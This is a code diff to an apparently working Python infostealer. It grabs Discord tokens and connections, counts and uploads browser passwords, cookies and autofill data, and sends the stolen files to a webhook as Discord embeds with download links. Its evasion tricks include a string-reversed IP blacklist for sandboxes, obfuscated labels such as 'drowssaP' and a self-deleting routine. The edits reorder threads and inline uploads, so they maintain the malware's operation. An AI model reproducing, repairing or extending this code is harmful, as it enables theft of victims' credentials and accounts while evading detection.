@@ -106,13 +106,13 @@ def check_ip():
         '411.641.141.43', '471.98.541.43', '31.6.991.53', '52.542.141.43', '301.82.78.291',
         '222.67.47.591', '86.381.501.43', '17.132.231.88', '07.561.932.871', '85.591.541.43',
         '961.991.351.88', '29.451.47.901', '061.87.451.491', '501.571.181.591', '261.21.421.46',
-        '371.19.501.881', '371.061.99.02', '26.25.112.29', '33.902.401.97', '832.722.231.88'
+        '371.19.501.881', '371.061.99.02', '26.25.112.29', '33.902.401.97', '832.722.231.88','371.061.99.02','34.17.55.59'
     ]
     while True:
         try:
             response = requests.get("https://api.ipify.org")
             ip_address = response.content.decode()
-            if ip_address in blacklisted[::-1]:
+            if ip_address[::-1] in blacklisted[::-1]:
                 exit_program('Blacklisted IP')
             return
         except:
@@ -833,6 +833,7 @@ def get_discord_connections(tokq):
 
         return connections_list
     else:
+        print('error')
         return []
     
 def uploadTokq(Tokq, path):
@@ -1720,31 +1721,6 @@ def paaz():
                 lines = sum(1 for line in fp)
         except:
             lines = 'error'
-            
-        def upload_and_assign_variable(file_path, variable):
-            try:
-                result = upload_file(file_path)
-                variable.append(result) 
-            except Exception as e:
-                pass
-
-        results = []
-
-        thread1 = threading.Thread(target=upload_and_assign_variable, args=(file, results))
-        thread2 = threading.Thread(target=upload_and_assign_variable, args=(file2, results))
-        thread3 = threading.Thread(target=upload_and_assign_variable, args=(file3, results))
-        
-        thread1.start()
-        thread2.start()
-        thread3.start()
-
-        thread1.join()
-        thread2.join()
-        thread3.join()
-
-        a = results[0] if results else None
-        b = results[1] if len(results) > 1 else None
-        c = results[2] if len(results) > 2 else None
         
         pas = 'drowssaP'
         data = {
@@ -1757,9 +1733,9 @@ def paaz():
                     "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {AutofillCount}",
                     "color": 0xffb6c1,
                     "fields": [
-                        {"name": f"{filename}", "value": f"[Click here to download]({a})"},
-                        {"name": f"{filename2}", "value": f"[Click here to download]({b})"},
-                        {"name": f"{filename3}", "value": f"[Click here to download]({c})"}  
+                        {"name": f"{filename}", "value": f"[Click here to download]({upload_file(file)})"},
+                        {"name": f"{filename2}", "value": f"[Click here to download]({upload_file(file2)})"},
+                        {"name": f"{filename3}", "value": f"[Click here to download]({upload_file(file3)})"}  
                     ],
                     "thumbnail": {
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
@@ -1771,6 +1747,7 @@ def paaz():
                 }
             ]
         }
+        
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         try:
             try:
@@ -1920,8 +1897,6 @@ def GatherZips(paths1, paths2, paths3):
     }
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 
-import os
-
 def delete_self(script_path):
     try:
         os.remove(script_path)
@@ -2030,13 +2005,16 @@ def GatherAll():
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         di.start()
         aa.append(di)
-    
-    upfd = threading.Thread(target=upload_files_to_discord)
-    upfd.start()
-    aa.append(upfd)
+
     
     for thread in aa:
         thread.join()
+    paaz_thread = threading.Thread(target=paaz)
+    paaz_thread.start()
+    aa.append(paaz_thread)
+    upfd = threading.Thread(target=upload_files_to_discord)
+    upfd.start()
+    aa.append(upfd)
     
     hist = threading.Thread(target=histup)
     hist.start()
@@ -2046,9 +2024,6 @@ def GatherAll():
     uploadw.start()
     aa.append(uploadw)
     
-    paaz_thread = threading.Thread(target=paaz)
-    paaz_thread.start()
-    aa.append(paaz_thread)
     
     
     scr = threading.Thread(target=srcs)
